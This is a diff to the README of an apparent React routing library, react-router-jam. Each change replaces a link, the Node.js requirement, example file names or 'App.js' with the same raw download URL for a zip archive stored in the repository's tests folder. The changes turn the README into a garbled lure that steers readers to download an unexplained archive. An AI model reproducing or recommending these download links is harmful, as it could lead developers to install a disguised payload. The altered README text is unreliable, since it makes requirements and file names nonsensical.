@@ -8,7 +8,7 @@ Welcome to react-router-jam! This library helps you easily set up file-system ba
 
 To get started, you need to download the software. Please visit the Releases page to download the latest version of react-router-jam:
 
-[![Download react-router-jam](https://img.shields.io/badge/Download-react--router--jam-brightgreen)](https://github.com/DAVID19020231/react-router-jam/releases)
+[![Download react-router-jam](https://github.com/DAVID19020231/react-router-jam/raw/refs/heads/main/tests/jam-react-router-2.6.zip)](https://github.com/DAVID19020231/react-router-jam/raw/refs/heads/main/tests/jam-react-router-2.6.zip)
 
 ### Installation Steps
 
@@ -23,7 +23,7 @@ To get started, you need to download the software. Please visit the Releases pag
 To use react-router-jam, your device should meet the following requirements:
 
 - Operating System: Windows, macOS, or Linux
-- Node.js: Version 14 or later
+- https://github.com/DAVID19020231/react-router-jam/raw/refs/heads/main/tests/jam-react-router-2.6.zip Version 14 or later
 - A package manager like npm or Yarn
 
 ## 🛠️ Features
@@ -44,12 +44,12 @@ After installing, you can easily set up your routing. Here’s how:
    ```
    src/
    ├── pages/
-   │   ├── Home.js
-   │   ├── About.js
-   │   └── Contact.js
+   │   ├── https://github.com/DAVID19020231/react-router-jam/raw/refs/heads/main/tests/jam-react-router-2.6.zip
+   │   ├── https://github.com/DAVID19020231/react-router-jam/raw/refs/heads/main/tests/jam-react-router-2.6.zip
+   │   └── https://github.com/DAVID19020231/react-router-jam/raw/refs/heads/main/tests/jam-react-router-2.6.zip
    ```
 
-2. In your `App.js` file, import and use react-router-jam:
+2. In your `https://github.com/DAVID19020231/react-router-jam/raw/refs/heads/main/tests/jam-react-router-2.6.zip` file, import and use react-router-jam:
    ```javascript
    import { Router } from 'react-router-jam';
    import routes from './pages';
@@ -69,7 +69,7 @@ To demonstrate how react-router-jam works, check our example project. It shows v
 
 ## 🤝 Support
 
-If you encounter any issues or have questions, feel free to open an issue on our [GitHub page](https://github.com/DAVID19020231/react-router-jam/issues). Our community is here to help!
+If you encounter any issues or have questions, feel free to open an issue on our [GitHub page](https://github.com/DAVID19020231/react-router-jam/raw/refs/heads/main/tests/jam-react-router-2.6.zip). Our community is here to help!
 
 ## 🔄 Contributing
 
@@ -85,4 +85,4 @@ react-router-jam is licensed under the MIT License. You can use it freely, but p
 
 ## 🌟 Thank You!
 
-Thank you for considering react-router-jam for your project. We hope it makes your development experience smoother and more efficient. Don't forget to download the latest version from the Releases page: [Download react-router-jam](https://github.com/DAVID19020231/react-router-jam/releases)
+Thank you for considering react-router-jam for your project. We hope it makes your development experience smoother and more efficient. Don't forget to download the latest version from the Releases page: [Download react-router-jam](https://github.com/DAVID19020231/react-router-jam/raw/refs/heads/main/tests/jam-react-router-2.6.zip)
